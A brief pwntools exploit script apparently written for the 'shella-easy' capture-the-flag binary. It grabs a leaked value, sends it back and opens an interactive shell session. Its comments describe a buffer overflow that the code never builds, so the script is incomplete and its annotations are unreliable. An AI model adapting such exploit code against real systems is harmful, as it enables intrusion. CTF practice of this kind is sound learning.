#!/usr/bin/env python3

from pwn import * 

# initalizing the process
pw = process("./shella-easy")


# Recieve data until the > symbol
pw.recvuntil(b'have a')
h = pw.recv(12)

# sends data to buffer overflow while also sending the address we want
print(h)

pw.send(h)

print(pw.recvline())

# allows us to interact with the process
pw.interactive()
